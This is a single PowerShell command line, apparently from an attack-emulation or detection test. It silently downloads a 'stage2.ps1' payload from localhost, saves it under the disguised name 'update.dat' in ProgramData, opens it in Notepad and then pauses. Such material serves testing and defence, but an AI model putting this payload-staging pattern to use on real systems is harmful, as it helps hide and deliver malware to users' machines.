curl.exe -s -L -o "C:\ProgramData\update.dat" "https://127.0.0.1/stage2.ps1"; Start-Process -FilePath "notepad.exe" -ArgumentList "C:\ProgramData\update.dat"; Start-Sleep -Seconds 39
